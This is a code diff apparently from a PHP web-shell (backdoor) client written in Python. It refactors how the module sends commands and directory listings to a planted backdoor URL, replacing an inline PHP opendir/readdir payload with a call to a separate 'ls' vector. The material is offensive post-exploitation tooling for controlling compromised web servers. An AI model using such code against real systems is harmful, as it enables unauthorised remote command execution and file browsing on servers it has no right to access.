@@ -22,8 +22,6 @@ WARN_CONN_ERR = 'Error connecting to backdoor URL or proxy'
 WARN_INVALID_RESPONSE = 'skipping invalid response'
 WARN_PHP_INTERPRETER_FAIL = 'PHP and Shell interpreters load failed'
 MSG_PHP_INTERPRETER_SUCCEED = 'PHP and Shell interpreters load succeed'
-WARN_LS_FAIL = 'listing failed, no such file or directory or permission denied'
-WARN_LS_ARGS = 'Error, PHP shell \'ls\' replacement supports only one <path> argument'
 
 class Php(Module):
     '''Execute PHP statement'''
@@ -45,7 +43,10 @@ class Php(Module):
         self.argparser.add_argument('-post', help=SUPPRESS, type=type({}), default={})
         self.argparser.add_argument('-just-probe', help=SUPPRESS, action='store_true')
 
-
+    def _set_vectors(self):
+        
+        self.support_vectors.add_vector(name='ls', interpreter='file.ls', payloads = [ '$rpath' ])
+ 
     def _prepare(self):
                 
         # Slacky backdoor validation. 
@@ -79,7 +80,12 @@ class Php(Module):
         
         # If 'ls', execute __ls_handler
         if self.args['cmd'][0][:2] == 'ls':
-            self._result = self.__ls_handler(self.args['cmd'][0])
+            
+            rpath = ''
+            if ' ' in self.args['cmd'][0]:
+                rpath = self.args['cmd'][0].split(' ')[1]
+                
+            self._result = '\n'.join(self.support_vectors.get('ls').execute({'rpath' : rpath }))
         else:
             self._result = self.__do_request(self.args['cmd'], self.args['mode'])
         
@@ -151,31 +157,5 @@ class Php(Module):
         raise InitException(self.name, WARN_PHP_INTERPRETER_FAIL)
         
 
-    def __ls_handler (self, cmd):
-
-        path = None
-        cmd_splitted = cmd.split(' ')
-        
-        if len(cmd_splitted)>2:
-            raise ProbeException(self.name, WARN_LS_ARGS)
-        elif len(cmd_splitted)==2 and hasattr(self.stored_args_namespace, 'path'):
-            # Should join with remote os.sep, but this should work (PHP support '\' as '/')
-            path = os.path.join(getattr(self.stored_args_namespace, 'path'), cmd_splitted[1])
-        elif len(cmd_splitted)==2:
-            # Is that fallback useful?
-            path = cmd_splitted[1]
-        elif hasattr(self.stored_args_namespace, 'path'):
-            path = getattr(self.stored_args_namespace, 'path')
-        else:
-            path = '.'
-
-        if path:
-            response = self.__do_request("$path=\"%s\"; $d=@opendir($path); $a=array(); if($d) { while(($f = readdir($d))) { $a[]=$f; }; sort($a); print(join('\n', $a)); }" % path, getattr(self.stored_args_namespace, 'mode'))
-            
-            if response:
-                return response
-        
-        raise ProbeException('', "'%s' %s" % (path, WARN_LS_FAIL ))
-            
 
 
